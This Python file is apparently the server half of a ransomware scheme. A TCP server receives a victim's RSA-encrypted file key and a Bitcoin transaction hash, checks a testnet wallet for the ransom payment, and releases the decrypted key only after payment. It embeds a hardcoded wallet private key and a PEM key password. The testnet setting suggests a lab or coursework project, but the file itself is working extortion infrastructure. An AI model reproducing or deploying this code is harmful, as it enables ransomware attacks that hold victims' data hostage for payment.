import socketserver
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives import serialization
from bit import PrivateKeyTestnet


RANSOM_AMOUNT = 12000
KEY = PrivateKeyTestnet("cSip1D3fj6RuhMRUpCbn3ANrXKytcXY4JbqfGv9GQL9h2bJLuELr")


class ClientHandler(socketserver.BaseRequestHandler):

    def setup(self) -> None:
        pass

    def handle(self):
        self.amount_paid = 'amount=' + str(RANSOM_AMOUNT)
        recved = self.request.recv(4096).strip()
        encrypted_key = recved[:512]
        self.transaction_hash = recved[512:577].strip().decode("utf-8")
        # self.transaction_hash = self.request.recv(4096).strip()[:65].decode("utf-8")
        self.transaction_id = "txid=" + "\'" + str(self.transaction_hash) + "\'"
        self.transactions = [str(t).strip("Unspent()").split(', ') for t in KEY.get_unspents()]
        self.is_ransom_paid = self.check_transaction(self.transactions, self.amount_paid, self.transaction_id)

        if self.is_ransom_paid and len(self.transaction_hash) == 64:

            # load the private key from the file key.pem
            with open("key.pem", "rb") as key_file:
                private_key = serialization.load_pem_private_key(

                    key_file.read(),

                    password=b'mypassword'

                )

            #  Decrypt the encrypted key using the private key
            plaintext = private_key.decrypt(

                encrypted_key,

                padding.OAEP(

                    mgf=padding.MGF1(algorithm=hashes.SHA256()),
                    algorithm=hashes.SHA256(),
                    label=None

                )

            )

            # send the decrypted symmetric key back
            self.request.sendall(plaintext)
        else:
            self.request.send(b"ERROR")
            # self.handle()

    def check_transaction(self, transactions, amount_paid, transaction_id):
        with open("./transactions.txt", 'r') as file:
            tr = [i.strip('\n') for i in file.readlines()]
        for lst in transactions:
            if amount_paid in lst and transaction_id in lst and transaction_id not in tr:
                with open("./transactions.txt", 'a+') as file1:
                    file1.write(transaction_id+'\n')
                return True


if __name__ == "__main__":

    HOST, PORT = "", 8000

    tcpServer = socketserver.TCPServer((HOST, PORT), ClientHandler)

    try:
        tcpServer.serve_forever()
    except Exception as e:
        print("There was an error:\n" + str(e))

    quit()
